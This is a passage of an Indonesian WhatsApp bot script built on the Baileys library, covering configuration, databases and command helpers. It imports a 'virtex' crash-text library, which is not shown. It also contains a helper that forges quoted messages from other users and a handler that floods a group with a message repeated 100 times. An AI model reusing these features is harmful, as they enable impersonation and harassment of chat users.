
────────────────────────────────────────────────────────────────────────────────────────                                                                                                                                                                                                                                                                */
limitawal = "50" //LIMIT AWAL
namabot = "Its Me Xinzz" //NAMA BOT
namaowner = "OWNER Xinzz🎖️" //NAMA OWNER
nomerowner = '6281994112523' //NOMER OWNER
gamewaktu = "300" //3 = 3 detik || 30 = 30 detik .Dst
numbernye = "0" //GAUSAH DI UBAH JUGA GPP
gcounttprem = "35" //LIMIT GAME AWAL UNTUK USER PREMIUM
gcounttuser = "40" //LIMIT GAME AWAL UNTUK USER BIASA
f = "⬡"
prefa = "!"

//🇮 🇸 🇮  🇦 🇵 🇮 🇰 🇪 🇾  🇲 🇺  🇩 🇮 🇸 🇮 🇳 🇮 
const lolkey = 'isi' //MASUKAN APIKEYMU DI DISINI, JANGAN LUPA BUKA DAN TUTUP PAKE TANDA ( ' ) CONTOH = 'APIKEYNYA'

//DONASI 
//NOTE : JIKA GA PUNYA, ISI JADI -
gopay = '085883359262'
dana = '085883359262'
ovo = '085883359262'
shopeepay = '-'
paypal = '-'
saweria = '-'
ewalet = '-'


//GANTI ANU ANUNYA DI SINI
mess = {

wait: 'Please waitt..',
limit: 'Limit Kamu Sudah Habis, Silahkan Belii Lewat #buylimit (nominal) atau minta gift dari temen mu',
glimit: 'Limit Game Kamu Sudah Habis\nSilahkan Beli Lewat #buyglimit (nominal) atau minta gift dari temen mu',
sewabot: `━ 「 𝗦𝗘𝗪𝗔 𝗕𝗢𝗧 」 ━

30k / PERMANENT (FREE PREMIUM)

─ *PREMIUM USER* ─

10K / BULAN

minat? wa.me/${nomerowner}`,

noregis: `─ 「 *NOT REGISTERED* 」 ─

Maaf Sepertinya Kamu Belum Terdaftar Di Dalam Database Bot,
Ketik #daftar Untuk Mendaftarkan Diri Ke Dalam Databse Bot`,

ban: '_*Maaf Kamu Sudah TerBanned!!*_',
error: 'Hehehe Error',

only: {
  personal: '_*PRIVATE ONLY*_',
  admin: '_*ADMIN GROUP ONLY*_',
  group: '_*GROUP ONLY*_',
  prem: '_*USER PREMIUM ONLY*_',
  owner: '_*OWNER ONLY*_',
  }
  } 
//
public = true //TRUE = CONNECT AUTO PUBLIC MODE || FALSE = CONNECT AUTO SELF MODE
mlistmsg = true //TRUE = CONNECT AUTO LISTMENU LIST MESSAGE || FALSE = CONNECT AUTO LIST MENU TEKS ORI
autoupdatebio = true
multiprefix = true //TRUE = CONNECT AUTO MULTI PREFIX
nopref = false //TRUE = CONNECT AUTO NO PRERIX, NOTE : KALO NOPREF DI PAKE TRUE YANG MULTIPREFIX UBAH JADI FALSE. ITUPUN SEBALIKNYA, KALO MULTIPREFIX DI PAKE TRUE, NOPREFNYA PAKE FALSE
//
battre = "Tidak terdeteksi" //SAAT BATERAI TIDAK TERDETEKSI
charg = "Tidak terdeteksi" //SAAT CHARGER TIDAK TERDETEKSI
const imagebb = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
const imagebbthumb ="https://i.postimg.cc/8CFyqZMJ/20211222-071710.jpg"
const cewe = "https://i.postimg.cc/8CFyqZMJ/20211222-071710.jpg"




const {
   WAConnection: _WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   processTime,
   processTicksAndRejections,
   ECONNABORTED,
   apikey,
   mentionedJid,
   Browsers,
   WA_DEAFULT_EPHEMERAL,
   DataView,
   TypedArray,
} = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require("qrcode-terminal") 
const moment = require("moment-timezone") 
const fs = require("fs")
const axios = require('axios')
const toMs = require('ms')
const chalk = require("chalk")
const crypto = require('crypto')
const util = require('util');
const speed = require('performance-now')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const imgbb = require('imgbb-uploader')
const request = require('request')
const fetch = require('node-fetch')
const path = require('path')
const cd = 4.32e+7
const { spawn, exec, execSync } = require("child_process")
const hx = require('hxz-api')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const { webp2mp4File} = require('./lib/webp2mp4')

/******TO LIB******/
const { lirikLagu } = require('./lib/lirik.js');
const { color, bgcolor } = require('./lib/color')
const translate = require('./lib/translate')
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/aboutuser")
const Exif = require('./lib/exif');
const exif = new Exif();
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { cmdadd } = require('./lib/totalcmd.js')
const { msgFilter } = require('./lib/antispam')
const _prem = require('./lib/premium')
const _sewa = require("./lib/sewa")
const voting = JSON.parse(fs.readFileSync('./database/voting/voting.json'))
const { addVote, delVote } = require('./database/voting/vote')
const afk = require("./lib/afk")
const { yta, ytv, upload, uploadImages, styleText } = require('./lib/ytdl')
const { validmove, setGame } = require("./database/game/tictactoe/tictactoe");
const { casinoSave, setCasino, deleteCasino } = require("./database/game/casino/casino")
const { tiktokDown } = require("./lib/tiktok")
const game = require('./database/game/game')
const {addmtk,getJawabanMtk,isMtk, cekWaktuMtk, getMtkPosi, addgambar, getJawabanTG, isTebakGambar, cekWaktuTG, getTGPosi, addlirik, getJawabanTL, isTebakLirik, cekWaktuTL, getTLPosi, addfam, getjawaban100, isfam, cekWaktuFam, getfamposi, addcak, getJawabanCak, isCakLontong, cekWaktuCak, getCakPosi, addSiapa, getJawabanSA, isSiapaAku, cekWaktuSA, addotak, getJawabanAO, isAsahOtak, cekWaktuAO, getAOPosi, addkata, getJawabanTK, isTebakKata, cekWaktuTK, getTKPosi, addkimia, getJawabanTU, isTebakKimia, cekWaktuTU, getTUPosi, addbendera, getJawabanTB, isTebakBendera, cekWaktuTB, getTBPosi } = require('./database/game/game')
const menu = require('./menu.js')
const { wikiSearch } = require('./lib/wiki.js')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");
const { addCommands, getJawabanCmd, getSoalCmd, getCommandsPosi, checkCommands, isCreated, deleteCommands } = require('./lib/commands')
const virtex = require('./lib/VirusByFaridZz.js')
const { addcmd, getcmd, getcmdpos } = require('./lib/setcmd')
const fakeV = require('./lib/fakeV.js')
charging = false
autovn = true
ngetik = false
baterai = { baterai: 100, cas: false }

const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const _user = JSON.parse(fs.readFileSync('./database/user.json'))
const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'))
const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
const _level = JSON.parse(fs.readFileSync('./database/level.json'))
const _afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const antivo = JSON.parse(fs.readFileSync('./database/AVO.json'))
const atro = JSON.parse(fs.readFileSync('./database/ATO.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
const audionye = JSON.parse(fs.readFileSync('./database/audio.json'))
const badword = JSON.parse(fs.readFileSync('./database/badword.json'));
const grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
const senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
let cmdDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let stickerdb = JSON.parse(fs.readFileSync('./database/scmd.json'))

let tebakgambar = [];
let family100 = [];
let caklontong = [];
let tebaklirik = [];
let siapaaku = [];
let asahotak = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let mtk = [];

gambar = fs.readFileSync('./image/logo.jpeg')
gambar2 = fs.readFileSync('./image/logo2.jpeg')

const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
       }

const runtime = function(seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor(seconds % (3600 * 24) / 3600);
  var m = Math.floor(seconds % 3600 / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
}
const getGroupAdmins = (participants) => {
	admins = []
	for (let i of participants) {
		i.isAdmin ? admins.push(i.jid) : ''
	}
	return admins
}
const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}

const getLevelingXp = (sender) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].id === sender) {
position = i
}
})
if (position !== false) {
return _level[position].xp
}
}

const getLevelingLevel = (sender) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].id === sender) {
position = i
}
})
if (position !== false) {
return _level[position].level
}
}

const getLevelingId = (sender) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].id === sender) {
position = i
}
})
if (position !== false) {
return _level[position].id
}
}

const addLevelingXp = (sender, amount) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].id === sender) {
position = i
}
})
if (position !== false) {
_level[position].xp += amount
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}
}

const addLevelingLevel = (sender, amount) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].id === sender) {
position = i
}
})
if (position !== false) {
_level[position].level += amount
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}
}

const addLevelingId = (sender) => {
const obj = {id: sender, xp: 0, level: 0}
_level.push(obj)
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}
 const getUserRandomId = () => {
return _user[Math.floor(Math.random() * _user.length)].id
}

const addRegisterUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_user.push(obj)
fs.writeFileSync('./database/user.json', JSON.stringify(_user))
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const cekUser = (sender) => {
let status = false
Object.keys(_user).forEach((i) => {
if (_user[i].id === sender) {
status = true
}
})
return status
}

var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
     case 0: hari = "Minggu"; break;
     case 1: hari = "Senin"; break;
     case 2: hari = "Selasa"; break;
     case 3: hari = "Rabu"; break;
     case 4: hari = "Kamis"; break;
     case 5: hari = "Jum`at"; break;
     case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
     case 0: bulan1 = "Januari"; break;
     case 1: bulan1 = "Februari"; break;
     case 2: bulan1 = "Maret"; break;
     case 3: bulan1 = "April"; break;
     case 4: bulan1 = "Mei"; break;
     case 5: bulan1 = "Juni"; break;
     case 6: bulan1 = "Juli"; break;
     case 7: bulan1 = "Agustus"; break;
     case 8: bulan1 = "September"; break;
     case 9: bulan1 = "Oktober"; break;
     case 10: bulan1 = "November"; break;
     case 11: bulan1 = "Desember"; break;
            }
            switch(waktoo){
     case 0: waktoo = "Malam"; break;
     case 1: waktoo = "Malam"; break;
     case 2: waktoo = "Malam"; break;
     case 3: waktoo = "Pagi"; break;
     case 4: waktoo = "Pagi"; break;
     case 5: waktoo = "Pagi"; break;
     case 6: waktoo = "Pagi"; break;
     case 7: waktoo = "Pagi"; break;
     case 8: waktoo = "Pagi"; break;
     case 9: waktoo = "Pagi"; break;
     case 10: waktoo = "Pagi"; break;
     case 11: waktoo = "Siang"; break;
     case 12: waktoo = "Siang"; break;
     case 13: waktoo = "Siang"; break;
     case 14: waktoo = "Siang"; break;
     case 15: waktoo = "Sore"; break;
     case 16: waktoo = "Sore"; break;
     case 17: waktoo = "Senja"; break;
     case 18: waktoo = "Senja"; break;
     case 19: waktoo = "Malam"; break;
     case 20: waktoo = "Malam"; break;
     case 21: waktoo = "Malam"; break;
     case 22: waktoo = "Malam"; break;
     case 23: waktoo = "Malam"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + ", " + bulan1 + ", " + tahun;
            var tampilWaktu = "" + jam + " Jam , " + menit + " Menit , " + detik + " Detik";
            
module.exports = YANZ = async (YANZ, mek) => {
       	try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
		if (!mek.message) return 
		if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
            YANZ.sendMessage(mek.key.remoteJid, `MASS ADA BUG GC >_<`, MessageType.text)
            YANZ.sendMessage(mek.key.remoteJid, `WADDOH ADA BUGGC`, MessageType.text)
            YANZ.sendMessage(mek.key.remoteJid, `*TANDAI TELAH DI BACA YE SLUR*\n`.repeat(100), MessageType.text)
            }
		m = simple.smsg(YANZ, mek)
		global.prefix
		global.blocked
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { MessageType, WAMessageProto } = require('@adiwajshing/baileys')
		const { buttonsMessage, text, extendedText, contact, contacsArray, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const jam = moment().tz('Asia/Jakarta').format("HH:mm:ss")
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
            const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
            function formatDate(n, locale = 'id') {
            let d = new Date(n)
            return d.toLocaleDateString(locale, {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric'
            })
            }
            let d = new Date
		let locale = 'id'
            let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
		let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
		let week = d.toLocaleDateString(locale, { weekday: 'long' })
		let date = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
		let waktu = d.toLocaleDateString(locale, { hour: 'numeric', minute: 'numeric', second: 'numeric' })
        	const type = Object.keys(mek.message)[0]
            const cmd = (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId && m.quoted.sender === YANZ.user.jid) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'listResponseMessage' && mek.message.listResponseMessage.singleSelectReply.selectedRowId && m.quoted.sender === YANZ.user.jid) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getcmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getcmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? getcmd(mek.message.stickerMessage.fileSha256.toString('hex')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
            if (multiprefix){
            var prefix = /^[•×¶∆£¢€¥~+×!#%&.,/\^]/.test(cmd) ? cmd.match(/^[•×¶∆£¢€¥~+×!#%&.,/\^]/gi) : '!'
            } else {
            if (nopref){
            prefix = ''
            } else {
            prefix = prefa
            }
            }            
            body = (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) && m.quoted.sender === YANZ.user.jid) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'listResponseMessage' && mek.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) && m.quoted.sender === YANZ.user.jid) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getcmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getcmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== undefined) ? (getcmd(mek.message.stickerMessage.fileSha256.toString('hex')).startsWith(prefix) ? getcmd(mek.message.stickerMessage.fileSha256.toString('hex')) : '') : ""
            budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		qb = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
            const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
 		const args = body.trim().split(/ +/).slice(1)
		chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
            const arg = chats.slice(command.length + 2, chats.length)
            const arg2 = budy.slice(command.length + 1, budy.length)
            const argss = body.split(/ +/g)
		const isCmd = body.startsWith(prefix)
		if (isCmd) cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
		const q = args.join(' ')
		const botNumber = YANZ.user.jid
		const botNumberss = YANZ.user.jid.split("@")[0] + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let senderr = mek.key.fromMe ? YANZ.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
            const itsMe = sender == botNumber ? true : false
		const isSelf = mek.key.fromMe ? true : false
            const senderNumber = sender.split("@")[0]
		const totalchat = await YANZ.chats.all()
		const ownerNumber = [`${nomerowner}@s.whatsapp.net`]
            const unread = await YANZ.loadAllUnreadMessages()
            const conts = mek.key.fromMe ? YANZ.user.jid : YANZ.contacts[sender] || { notify: jid.replace(/@.+/, '') }
            const orang = sender.split("@")[0]
            const me = YANZ.user
            const nomerbot = me.jid.split("@")[0]

            const pushname = mek.key.fromMe ? YANZ.user.name : conts.notify || conts.vname || conts.name || '-'
            const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
            const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
            const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
            mention != undefined ? mention.push(mentionByreply) : []
            const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const groupMetadata = isGroup ? await YANZ.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.id : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

            var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
            const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

		const isOwner = ownerNumber.includes(sender)
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false

            const isAntiLink = isGroup ? antilink.includes(from) : true
            const isAntiVo = isGroup ? antivo.includes(from) : false
            const isAntro = isGroup ? atro.includes(from) : false
            const isWelkom = isGroup ? welkom.includes(from) : true
            const isAfkOn = afk.checkAfkUser(sender, _afk)
            const isVote = isGroup ? voting.includes(from) : false
            const isSewa = _sewa.checkSewaGroup(from, sewa)
            const isPrem = isOwner ? true : _prem.checkPremiumUser(sender, premium)
            const isUser = cekUser(sender)
            const gcount = isPrem ? gcounttprem : gcounttuser
            const isBan = ban.includes(sender)
            const isBadword = isGroup ? grupbadword.includes(from) : false

   /*ANTIDELETE*/
    const dataRevoke = JSON.parse(fs.readFileSync('./database/gc-revoked.json'))
    const dataCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked.json'))
    const dataBanCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked-banlist.json'))
    const isRevoke = dataRevoke.includes(from)
    const isCtRevoke = dataCtRevoke.data
    const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false

const processsTime = (timestamp, now) => {
return moment.duration(now - moment(timestamp * 1000)).asSeconds()} 



        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
        const listmsg = (from, title, desc, button, futer, list) => {
        let po = YANZ.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": button,"footerText": futer+'\nBot Created by Herman Chanel',"listType": "SINGLE_SELECT","sections": list}}, {})
        return YANZ.relayWAMessage(po, {waitForAck: true})
        }
	  const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        function parseMention(text = '') {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }
        const reply = (teks) => {
        return YANZ.sendMessage(from, teks, text, {quoted: mek, contextInfo: { mentionedJid: parseMention(teks) }})
        }
        const sendImage = (teks) => {
        YANZ.sendMessage(from, teks, image, {quoted:mek})
         }
         function randomNomor(angka){
         return Math.floor(Math.random() * angka) + 1
        }
           function pickRandom(arr) {
            return arr[Math.floor(Math.random() * arr.length)]
        }
        const nebal = (angka) => {
            return Math.floor(angka)
        }
            const sendMess = (hehe, teks) => {
            YANZ.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? YANZ.sendMessage(from, {text: teks.trim(), jpegThumbnail: gambar}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : YANZ.sendMessage(from, {text: teks.trim(), jpegThumbnail: gambar}, extendedText, { sendEphemeral: true, quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
       const getUserrRandomId = () => {
        return _user[Math.floor(Math.random() * _user.length)].id
        }
        replybutton1 = (from, buttonAidi, footerTeks, teks, contentTeks) => {
        const buttons = [{buttonId: buttonAidi, buttonText: {displayText: teks}, type: 1}]
        const buttonMessage = {
        headerType: "IMAGE",
        contentText: contentTeks,
        footerText: footerTeks+'\nBOT created by Herman Chanel',
        buttons: buttons,
        headerType: 1
        }
        return YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek, contextInfo: { mentionedJid: parseMention(contentTeks) }})
        }
     
        replybutton = (from, buttonAidi, footerTeks, teks, contentTeks) => {
        const buttons = [{buttonId: buttonAidi, buttonText: {displayText: teks}, type: 1}]
        const buttonMessage = {
        headerType: "IMAGE",
        contentText: contentTeks,
        footerText: footerTeks+'\nBot created by Herman Chanel',
        buttons: buttons,
        headerType: 1
        }
        return YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
        }         
	  const sendTextWithMentions = (teks, member, id) => {
        (id == null || id == undefined || id == false) ? YANZ.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": member } }) : YANZ.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": member } })
        } 
        function monospace(string) {
        return '```' + string + '```'
        }   
  if (mek.key.fromMe){
  if (chats.toLowerCase() == '@self'){
  public = false
  reply(`*PUBLIC = ${public}*`)
  }
  if (chats.toLowerCase() == '@public'){ 
  public = true
  reply(`*PUBLIC = ${public}*`)
  }
  }
  if (public){
  if (mek.key.fromMe) return
  } else {
  if (!mek.key.fromMe && !isOwner) return
  }

      const hideTag = async function(from, text){
	let anu = await YANZ.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
      ane.push(i.jid)
	}
	YANZ.sendMessage(from, text, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
     }  
     const sendMention = async(from, text, mentioned, quoted = "") => {
     YANZ.sendMessage(from, text, text, { quoted: quoted, contextInfo: { mentionedJid: [mentioned] } })
     }
      const hideTagStiker = async(from, buffer) => {
      let anu = await YANZ.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
		ane.push(i.jid)
	}
      YANZ.sendMessage(from, buffer, sticker, { sendEphemeral: true, contextInfo: { mentionedJid: ane } })
      }
         const promoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await YANZ.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = YANZ.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await YANZ.groupMakeAdmin(to, [i])
           }else{
           reply("NOT PREMITED")
          }
          }
          }
      const demoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await YANZ.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = YANZ.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await YANZ.groupDemoteAdmin(to, [i])
           }else{
           reply("NOT PREMITED")
           }
           }
           }
           const kickMember = async(id, target = []) => {
           let group = await YANZ.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = YANZ.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await YANZ.groupRemove(to, [i])
        } else {
           await YANZ.sendMessage(id, "Not Premited!", "conversation")
           break
        }
    }
}
     const kick = function(from, orangnya){
	for (let i of orangnya){
		YANZ.groupRemove(from, [i])
	}
}
const add = function(from, orangnya){
	YANZ.groupAdd(from, orangnya)
}


const sendKontak = (from, nomor, nama, org = "") => {
	const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	YANZ.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}
const hideTagKontak = async(from, nomor, nama) => {
    vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
    let anu = await YANZ.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
      ane.push(i.jid)
	}
    YANZ.sendMessage(from, { displayname: nama, vcard: vcard }, contact, { contextInfo: { mentionedJid: ane } })
    }
const sendFileFromStorage = (path, type, options) => {
YANZ.sendMessage(from, fs.readFileSync(path), type, options).catch(e => {
reply('_[ ! ] Error Gagal Dalam Mengirim Media_')
console.log(e)
})
}
const getGroup = async function(totalchat){
	let grup = []
	let a = []
	let b = []
	for (c of totalchat){
		a.push(c.jid)
	}
	for (d of a){
		if (d && d.includes('g.us')){
			b.push(d)
		}
	}
	for (e of b){
		let ingfo = await YANZ.groupMetadata(e)
		grup.push(ingfo)
	}
	return grup
}
const fakeReply = (teks, target, teks2) => {
YANZ.sendMessage(from, teks, text, {quoted: {key: {fromMe: false, participant: `${target}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: teks2}}})
}
let authorname = YANZ.contacts[from] != undefined ? YANZ.contacts[from].vname || YANZ.contacts[from].notify : undefined	
if (authorname != undefined) { } else { authorname = groupName }	
function addMetadata(packname, author) {	
if (!packname) packname = 'self'; if (!author) author = 'YANZ';author = author.replace(/[^a-zA-Z0-9]/g, '');	
let name = `${author}_${packname}`
if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
const json = {	
"sticker-pack-name": packname,
"sticker-pack-publisher": author,
}
const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
let len = JSON.stringify(json).length	
let last	
if (len > 256) {	
len = len - 256	
bytes.unshift(0x01)	
} else {	
bytes.unshift(0x00)	
}	
if (len < 16) {	
last = len.toString(16)	
last = "0" + len	
} else {	
last = len.toString(16)	
}	
 const buf2 = Buffer.from(last, "hex")	
 const buf3 = Buffer.from(bytes)	
